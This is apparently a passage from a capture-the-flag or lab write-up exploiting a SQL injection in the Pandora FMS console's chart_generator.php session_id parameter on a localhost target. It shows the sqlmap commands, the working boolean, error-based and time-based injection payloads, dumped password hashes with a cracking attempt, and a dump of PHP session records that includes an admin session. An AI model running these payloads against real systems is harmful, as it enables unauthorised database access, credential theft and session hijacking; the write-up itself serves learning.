[11:29:07] [INFO] retrieved: 'tcredential_store'
[11:29:07] [INFO] retrieved: 'tupdate_package'
[11:29:07] [INFO] retrieved: 'tservice'
[11:29:07] [INFO] retrieved: 'tnetwork_component'
[11:29:07] [INFO] retrieved: 'tagente_datos_log4x'
[11:29:07] [INFO] retrieved: 'tmodule'
[11:29:07] [INFO] retrieved: 'tuser_task_scheduled'
[11:29:07] [INFO] retrieved: 'tserver_export_data'
[11:29:07] [INFO] retrieved: 'trecon_task'
[11:29:07] [INFO] retrieved: 'tsnmp_filter'
[11:29:08] [INFO] retrieved: 'tevent_response'
[11:29:08] [INFO] retrieved: 'tagente_datos'
[11:29:08] [INFO] retrieved: 'tmetaconsole_setup'
[11:29:08] [INFO] retrieved: 'tagent_module_inventory'
[11:29:08] [INFO] retrieved: 'tdashboard'
[11:29:08] [INFO] retrieved: 'tnotification_source'
[11:29:08] [INFO] retrieved: 'tplanned_downtime_modules'
[11:29:08] [INFO] retrieved: 'tincidencia'
[11:29:08] [INFO] retrieved: 'tpolicy_queue'
[11:29:08] [INFO] retrieved: 'ttag'
[11:29:08] [INFO] retrieved: 'tsesion'
[11:29:09] [INFO] retrieved: 'tlink'
[11:29:09] [INFO] retrieved: 'treport_content_template'
[11:29:09] [INFO] retrieved: 'tpolicy_alerts_actions'
[11:29:09] [INFO] retrieved: 'talert_templates'
[11:29:09] [INFO] retrieved: 'tprovisioning_rules'
[11:29:09] [INFO] retrieved: 'tnetworkmap_enterprise'
[11:29:09] [INFO] retrieved: 'ttag_module'
[11:29:09] [INFO] retrieved: 'tpolicies'
[11:29:09] [INFO] retrieved: 'ttag_policy_module'
[11:29:09] [INFO] retrieved: 'tnetwork_matrix'
[11:29:09] [INFO] retrieved: 'talert_special_days'
[11:29:10] [INFO] retrieved: 'tnews'
[11:29:10] [INFO] retrieved: 'twidget'
[11:29:10] [INFO] retrieved: 'tmetaconsole_event_history'
[11:29:10] [INFO] retrieved: 'tlayout_data'
[11:29:10] [INFO] retrieved: 'tautoconfig'
[11:29:10] [INFO] retrieved: 'tnetflow_report_content'
[11:29:10] [INFO] retrieved: 'tgis_map_layer'
[11:29:10] [INFO] retrieved: 'tremote_command_target'
[11:29:10] [INFO] retrieved: 'tusuario_perfil'
[11:29:10] [INFO] retrieved: 'tgraph'
[11:29:10] [INFO] retrieved: 'tconfig'
[11:29:11] [INFO] retrieved: 'tfiles_repo_group'
[11:29:11] [INFO] retrieved: 'tagente'
[11:29:11] [INFO] retrieved: 'treport'
[11:29:11] [INFO] retrieved: 'tautoconfig_actions'
[11:29:11] [INFO] retrieved: 'tlanguage'
[11:29:11] [INFO] retrieved: 'tmodule_group'
[11:29:11] [INFO] retrieved: 'tdeployment_hosts'
[11:29:11] [INFO] retrieved: 'trel_item'
[11:29:11] [INFO] retrieved: 'tagente_modulo'
[11:29:11] [INFO] retrieved: 'tpolicy_collections'
[11:29:11] [INFO] retrieved: 'tdatabase'
[11:29:12] [INFO] retrieved: 'tmodule_synth'
[11:29:12] [INFO] retrieved: 'tmodule_relationship'
[11:29:12] [INFO] retrieved: 'titem'
[11:29:12] [INFO] retrieved: 'tcontainer_item'
[11:29:12] [INFO] retrieved: 'tnetwork_map'
[11:29:12] [INFO] retrieved: 'tmigration_queue'
[11:29:12] [INFO] retrieved: 'tpolicy_plugins'
[11:29:12] [INFO] retrieved: 'tcluster_agent'
[11:29:12] [INFO] retrieved: 'tnetflow_filter'
[11:29:12] [INFO] retrieved: 'tautoconfig_rules'
[11:29:12] [INFO] retrieved: 'tpolicy_modules_inventory'
[11:29:13] [INFO] retrieved: 'tcluster_item'
[11:29:13] [INFO] retrieved: 'tperfil'
[11:29:13] [INFO] retrieved: 'tnetwork_profile_component'
[11:29:13] [INFO] retrieved: 'tmetaconsole_event'
[11:29:13] [INFO] retrieved: 'tlocal_component'
[11:29:13] [INFO] retrieved: 'tupdate'
[11:29:13] [INFO] retrieved: 'tnota'
[11:29:13] [INFO] retrieved: 'tevent_custom_field'
[11:29:13] [INFO] retrieved: 'tagent_secondary_group'
[11:29:13] [INFO] retrieved: 'treport_content_sla_com_temp'
[11:29:13] [INFO] retrieved: 'tgrupo'
[11:29:13] [INFO] retrieved: 'tevent_extended'
[11:29:14] [INFO] retrieved: 'tcontainer'
[11:29:14] [INFO] retrieved: 'tagent_custom_fields_filter'
[11:29:14] [INFO] retrieved: 'taddress_agent'
[11:29:14] [INFO] retrieved: 'tpolicy_agents'
[11:29:14] [INFO] retrieved: 'tpolicy_groups'
[11:29:14] [INFO] retrieved: 'tevento'
Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+

[11:29:14] [INFO] fetched data logged to text files under '/home/noob2uub/.local/share/sqlmap/output/localhost'

[*] ending @ 11:29:14 /2022-04-20/
```

Lets take alook at this table | tpassword_history       

```console
noob2uub@kali:~$ sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=* -D pandora -T tpassword_history —dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:44:57 /2022-04-20/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[11:44:58] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:44:58] [INFO] resuming back-end DBMS 'mysql' 
[11:44:58] [INFO] testing connection to the target URL
[11:44:59] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e1tkfipm7lq...7lavm9qpci'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=-9377' OR 3978=3978#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 2785 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(2785=2785,1))),0x71626b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BkTO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 2966 FROM (SELECT(SLEEP(5)))dvHA)-- Najw
---
[11:45:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:45:00] [INFO] fetching columns for table 'tpassword_history' in database 'pandora'
[11:45:00] [WARNING] reflective value(s) found and filtering out
[11:45:00] [INFO] retrieved: 'id_pass'
[11:45:00] [INFO] retrieved: 'int(10) unsigned'
[11:45:00] [INFO] retrieved: 'id_user'
[11:45:00] [INFO] retrieved: 'varchar(60)'
[11:45:00] [INFO] retrieved: 'password'
[11:45:01] [INFO] retrieved: 'varchar(45)'
[11:45:01] [INFO] retrieved: 'date_begin'
[11:45:01] [INFO] retrieved: 'datetime'
[11:45:01] [INFO] retrieved: 'date_end'
[11:45:01] [INFO] retrieved: 'datetime'
[11:45:01] [INFO] fetching entries for table 'tpassword_history' in database 'pandora'
[11:45:01] [INFO] retrieved: '2021-06-11 17:28:54'
[11:45:01] [INFO] retrieved: '0000-00-00 00:00:00'
[11:45:01] [INFO] retrieved: '1'
[11:45:01] [INFO] retrieved: 'matt'
[11:45:01] [INFO] retrieved: 'f655f807365b6dc602b31ab3d6d43acc'
[11:45:02] [INFO] retrieved: '2021-06-17 00:11:54'
[11:45:02] [INFO] retrieved: '0000-00-00 00:00:00'
[11:45:02] [INFO] retrieved: '2'
[11:45:02] [INFO] retrieved: 'daniel'
[11:45:02] [INFO] retrieved: '76323c174bd49ffbbdedf678f6cc89a6'
[11:45:02] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[11:45:04] [INFO] writing hashes to a temporary file '/tmp/sqlmapuflmsp9h165470/sqlmaphashes-zn6hvhx4.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[11:45:05] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[11:45:33] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[11:45:35] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[11:45:35] [INFO] starting 4 processes 
[11:45:42] [INFO] using suffix '1'                                                                                                                                                                               
[11:45:49] [INFO] using suffix '123'                                                                                                                                                                             
[11:45:57] [INFO] using suffix '2'                                                                                                                                                                               
[11:46:04] [INFO] using suffix '12'                                                                                                                                                                              
[11:46:12] [INFO] using suffix '3'                                                                                                                                                                               
[11:46:19] [INFO] using suffix '13'                                                                                                                                                                              
[11:46:27] [INFO] using suffix '7'                                                                                                                                                                               
[11:46:34] [INFO] using suffix '11'                                                                                                                                                                              
[11:46:41] [INFO] using suffix '5'                                                                                                                                                                               
[11:46:49] [INFO] using suffix '22'                                                                                                                                                                              
[11:46:56] [INFO] using suffix '23'                                                                                                                                                                              
[11:47:04] [INFO] using suffix '01'                                                                                                                                                                              
[11:47:11] [INFO] using suffix '4'                                                                                                                                                                               
[11:47:18] [INFO] current status: ubria... |
[11:47:19] [INFO] using suffix '07'                                                                                                                                                                              
[11:47:19] [INFO] current status: 14101... \
[11:47:20] [INFO] current status: JPEGK... -^C
[11:47:20] [WARNING] user aborted during dictionary-based attack phase (Ctrl+C was pressed)
[11:47:20] [WARNING] no clear password(s) found                                                                                                                                                                  
Database: pandora
Table: tpassword_history
[2 entries]
+---------+---------+---------------------+----------------------------------+---------------------+
| id_pass | id_user | date_end            | password                         | date_begin          |
+---------+---------+---------------------+----------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
+---------+---------+---------------------+----------------------------------+---------------------+

[11:47:20] [INFO] table 'pandora.tpassword_history' dumped to CSV file '/home/noob2uub/.local/share/sqlmap/output/localhost/dump/pandora/tpassword_history.csv'
[11:47:20] [INFO] fetched data logged to text files under '/home/noob2uub/.local/share/sqlmap/output/localhost'

[*] ending @ 11:47:20 /2022-04-20/
```
The other DB Table to look at is tsession.php based on sonar blogs write up. 

```console
/include/lib/User.php

60  public function __construct($data)
61  {
 ⋮
68     if (is_array($data) === true) {
69        if (isset($data['phpsessionid']) === true) {
70           $this->sessions[$data['phpsessionid']] = 1;
71           $info = \db_get_row_filter(
72              'tsessions_php',
73              ['id_session' => $data['phpsessionid']]
74          );
75
76         if ($info !== false) {
77            // Process.
78            $session_data = session_decode($info['data']);
79            $this->idUser = $_SESSION['id_usuario'];
80
81            // Valid session.
82            return $this;
83         }
```
### tsession.php
```console
noob2uub@kali:~$ sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=* -D pandora -T tsessions_php —dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:51:47 /2022-04-20/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[11:51:50] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:51:50] [INFO] resuming back-end DBMS 'mysql' 
[11:51:50] [INFO] testing connection to the target URL
[11:51:50] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=opr5oocre9g...uum2plegmb'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=-9377' OR 3978=3978#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 2785 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(2785=2785,1))),0x71626b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BkTO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 2966 FROM (SELECT(SLEEP(5)))dvHA)-- Najw
---
[11:51:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:51:51] [INFO] fetching columns for table 'tsessions_php' in database 'pandora'
[11:51:52] [WARNING] reflective value(s) found and filtering out
[11:51:52] [INFO] retrieved: 'id_session'
[11:51:52] [INFO] retrieved: 'char(52)'
[11:51:52] [INFO] retrieved: 'last_active'
[11:51:52] [INFO] retrieved: 'int(11)'
[11:51:52] [INFO] retrieved: 'data'
[11:51:52] [INFO] retrieved: 'text'
[11:51:52] [INFO] fetching entries for table 'tsessions_php' in database 'pandora'
[11:51:53] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:53] [INFO] retrieved: '09vao3q1dikuoi1vhcvhcjjbc6'
[11:51:53] [INFO] retrieved: '1638783555'
[11:51:53] [INFO] retrieved: ' '
[11:51:53] [INFO] retrieved: '0ahul7feb1l9db7ffp8d25sjba'
[11:51:53] [INFO] retrieved: '1638789018'
[11:51:53] [INFO] retrieved: ' '
[11:51:53] [INFO] retrieved: '1d2hth40naftamc3cmv95liouj'
[11:51:53] [INFO] retrieved: '1650479085'
[11:51:53] [INFO] retrieved: ' '
[11:51:54] [INFO] retrieved: '1k5cghf85jrdkbgidg1nu1dn60'
[11:51:54] [INFO] retrieved: '1650478876'
[11:51:54] [INFO] retrieved: ' '
[11:51:54] [INFO] retrieved: '1um23if7s531kqf5da14kf5lvm'
[11:51:54] [INFO] retrieved: '1638792211'
[11:51:54] [INFO] retrieved: ' '
[11:51:54] [INFO] retrieved: '2e25c62vc3odbppmg6pjbf9bum'
[11:51:54] [INFO] retrieved: '1638786129'
[11:51:54] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:54] [INFO] retrieved: '346uqacafar8pipuppubqet7ut'
[11:51:54] [INFO] retrieved: '1638540332'
[11:51:54] [INFO] retrieved: ' '
[11:51:55] [INFO] retrieved: '3me2jjab4atfa5f8106iklh4fc'
[11:51:55] [INFO] retrieved: '1638795380'
[11:51:55] [INFO] retrieved: ' '
[11:51:55] [INFO] retrieved: '4f51mju7kcuonuqor3876n8o02'
[11:51:55] [INFO] retrieved: '1638786842'
[11:51:55] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:55] [INFO] retrieved: '4nsbidcmgfoh1gilpv8p5hpi2s'
[11:51:55] [INFO] retrieved: '1638535373'
[11:51:55] [INFO] retrieved: 'id_usuario|s:5:"admin";'
[11:51:55] [INFO] retrieved: '4tchtun668mom3l34hqogkebf8'
[11:51:55] [INFO] retrieved: '1650477567'
[11:51:56] [INFO] retrieved: ' '
[11:51:56] [INFO] retrieved: '59qae699l0971h13qmbpqahlls'
[11:51:56] [INFO] retrieved: '1638787305'
[11:51:56] [INFO] retrieved: ' '
[11:51:56] [INFO] retrieved: '5fihkihbip2jioll1a8mcsmp6j'
[11:51:56] [INFO] retrieved: '1638792685'
[11:51:56] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:56] [INFO] retrieved: '5i352tsdh7vlohth30ve4o0air'
[11:51:56] [INFO] retrieved: '1638281946'
[11:51:56] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:56] [INFO] retrieved: '69gbnjrc2q42e8aqahb1l2s68n'
[11:51:57] [INFO] retrieved: '1641195617'
[11:51:57] [INFO] retrieved: ' '
[11:51:57] [INFO] retrieved: '6u8oaph5h1qdm83ln4rh96kjdm'
[11:51:57] [INFO] retrieved: '1650479912'
[11:51:57] [INFO] retrieved: ' '
[11:51:57] [INFO] retrieved: '7ugkpf9nvbgjtjipiaif07koc5'
[11:51:57] [INFO] retrieved: '1650478923'
[11:51:57] [INFO] retrieved: ' '
[11:51:57] [INFO] retrieved: '7va8m1hflfplu85e101mt3g8hf'
[11:51:57] [INFO] retrieved: '1650479904'
[11:51:58] [INFO] retrieved: ' '
[11:51:58] [INFO] retrieved: '81f3uet7p3esgiq02d4cjj48rc'
[11:51:58] [INFO] retrieved: '1623957150'
[11:51:58] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:58] [INFO] retrieved: '8m2e6h8gmphj79r9pq497vpdre'
[11:51:58] [INFO] retrieved: '1638446321'
[11:51:58] [INFO] retrieved: ' '
[11:51:58] [INFO] retrieved: '8upeameujo9nhki3ps0fu32cgd'
[11:51:58] [INFO] retrieved: '1638787267'
[11:51:58] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:58] [INFO] retrieved: '9vv4godmdam3vsq8pu78b52em9'
[11:51:58] [INFO] retrieved: '1638881787'
[11:51:59] [INFO] retrieved: ' '
[11:51:59] [INFO] retrieved: 'a3a49kc938u7od6e6mlip1ej80'
[11:51:59] [INFO] retrieved: '1638795315'
[11:51:59] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:51:59] [INFO] retrieved: 'agfdiriggbt86ep71uvm1jbo3f'
[11:51:59] [INFO] retrieved: '1638881664'
[11:51:59] [INFO] retrieved: ' '
[11:51:59] [INFO] retrieved: 'aocrdjm6j2lan5h4d7imtu04jh'
[11:51:59] [INFO] retrieved: '1650480003'
[11:51:59] [INFO] retrieved: ' '
[11:51:59] [INFO] retrieved: 'b2n0rh0vr16hmf0dot82j9pihl'
[11:52:00] [INFO] retrieved: '1650479939'
[11:52:00] [INFO] retrieved: ' '
[11:52:00] [INFO] retrieved: 'bbfk40smi3cr39nl7d8d4jpen2'
[11:52:00] [INFO] retrieved: '1650479971'
[11:52:00] [INFO] retrieved: ' '
[11:52:00] [INFO] retrieved: 'cojb6rgubs18ipb35b3f6hf0vp'
[11:52:00] [INFO] retrieved: '1638787213'
[11:52:00] [INFO] retrieved: ' '
[11:52:00] [INFO] retrieved: 'd0carbrks2lvmb90ergj7jv6po'
[11:52:00] [INFO] retrieved: '1638786277'
[11:52:00] [INFO] retrieved: ' '
[11:52:01] [INFO] retrieved: 'e1tkfipm7lq390mi7lavm9qpci'
[11:52:01] [INFO] retrieved: '1650480240'
[11:52:01] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:01] [INFO] retrieved: 'f0qisbrojp785v1dmm8cu1vkaj'
[11:52:01] [INFO] retrieved: '1641200284'
[11:52:01] [INFO] retrieved: ' '
[11:52:01] [INFO] retrieved: 'fikt9p6i78no7aofn74rr71m85'
[11:52:01] [INFO] retrieved: '1638786504'
[11:52:01] [INFO] retrieved: ' '
[11:52:01] [INFO] retrieved: 'fqd96rcv4ecuqs409n5qsleufi'
[11:52:01] [INFO] retrieved: '1638786762'
[11:52:02] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:02] [INFO] retrieved: 'g0kteepqaj1oep6u7msp0u38kv'
[11:52:02] [INFO] retrieved: '1638783230'
[11:52:02] [INFO] retrieved: 'id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;'
[11:52:02] [INFO] retrieved: 'g4e01qdgk36mfdh90hvcc54umq'
[11:52:02] [INFO] retrieved: '1638796349'
[11:52:02] [INFO] retrieved: ' '
[11:52:02] [INFO] retrieved: 'gf40pukfdinc63nm5lkroidde6'
[11:52:02] [INFO] retrieved: '1638786349'
[11:52:02] [INFO] retrieved: ' '
[11:52:03] [INFO] retrieved: 'heasjj8c48ikjlvsf1uhonfesv'
[11:52:03] [INFO] retrieved: '1638540345'
[11:52:03] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:03] [INFO] retrieved: 'hsftvg6j5m3vcmut6ln6ig8b0f'
[11:52:03] [INFO] retrieved: '1638168492'
[11:52:03] [INFO] retrieved: ' '
[11:52:03] [INFO] retrieved: 'i0gmmnuq07kig8pfdsurf8llr3'
[11:52:03] [INFO] retrieved: '1650480185'
[11:52:03] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:03] [INFO] retrieved: 'jecd4v8f6mlcgn4634ndfl74rd'
[11:52:03] [INFO] retrieved: '1638456173'
[11:52:04] [INFO] retrieved: ' '
[11:52:04] [INFO] retrieved: 'kp90bu1mlclbaenaljem590ik3'
[11:52:04] [INFO] retrieved: '1638787808'
[11:52:04] [INFO] retrieved: ' '
[11:52:04] [INFO] retrieved: 'ne9rt4pkqqd0aqcrr4dacbmaq3'
[11:52:04] [INFO] retrieved: '1638796348'
[11:52:04] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:04] [INFO] retrieved: 'o3kuq4m5t5mqv01iur63e1di58'
[11:52:04] [INFO] retrieved: '1638540482'
[11:52:04] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:04] [INFO] retrieved: 'oi2r6rjq9v99qt8q9heu3nulon'
[11:52:04] [INFO] retrieved: '1637667827'
[11:52:05] [INFO] retrieved: ' '
[11:52:05] [INFO] retrieved: 'opr5oocre9gd4ad0uum2plegmb'
[11:52:05] [INFO] retrieved: '1650480663'
[11:52:05] [INFO] retrieved: ' '
[11:52:05] [INFO] retrieved: 'ou3tspifvo6tiinka66eprft8a'
[11:52:05] [INFO] retrieved: '1650479933'
[11:52:05] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:05] [INFO] retrieved: 'pb75smfb0hc3lvmm4glq5b3oer'
[11:52:05] [INFO] retrieved: '1650469850'
[11:52:05] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:05] [INFO] retrieved: 'pjp312be5p56vke9dnbqmnqeot'
[11:52:06] [INFO] retrieved: '1638168416'
[11:52:06] [INFO] retrieved: ' '
[11:52:06] [INFO] retrieved: 'plgpa9gst0261ggq2h6acmohl4'
[11:52:06] [INFO] retrieved: '1650477238'
[11:52:06] [INFO] retrieved: ' '
[11:52:06] [INFO] retrieved: 'qq8gqbdkn8fks0dv1l9qk6j3q8'
[11:52:06] [INFO] retrieved: '1638787723'
[11:52:06] [INFO] retrieved: ' '
[11:52:06] [INFO] retrieved: 'qujvpae50d4jigagujj0rpdggr'
[11:52:06] [INFO] retrieved: '1650479292'
[11:52:06] [INFO] retrieved: ' '
[11:52:07] [INFO] retrieved: 'r097jr6k9s7k166vkvaj17na1u'
[11:52:07] [INFO] retrieved: '1638787677'
[11:52:07] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:07] [INFO] retrieved: 'rgku3s5dj4mbr85tiefv53tdoa'
[11:52:07] [INFO] retrieved: '1638889082'
[11:52:07] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:07] [INFO] retrieved: 'u5ktk2bt6ghb7s51lka5qou4r4'
[11:52:07] [INFO] retrieved: '1638547193'
[11:52:07] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:07] [INFO] retrieved: 'u5vp5lm3j9mtk1slljn9us89oi'
[11:52:07] [INFO] retrieved: '1650479017'
[11:52:08] [INFO] retrieved: 'id_usuario|s:6:"daniel";'
[11:52:08] [INFO] retrieved: 'u74bvn6gop4rl21ds325q80j0e'
[11:52:08] [INFO] retrieved: '1638793297'
Database: pandora
Table: tsessions_php
[56 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1d2hth40naftamc3cmv95liouj | NULL                                                | 1650479085  |
| 1k5cghf85jrdkbgidg1nu1dn60 | NULL                                                | 1650478876  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 4tchtun668mom3l34hqogkebf8 | id_usuario|s:5:"admin";                             | 1650477567  |
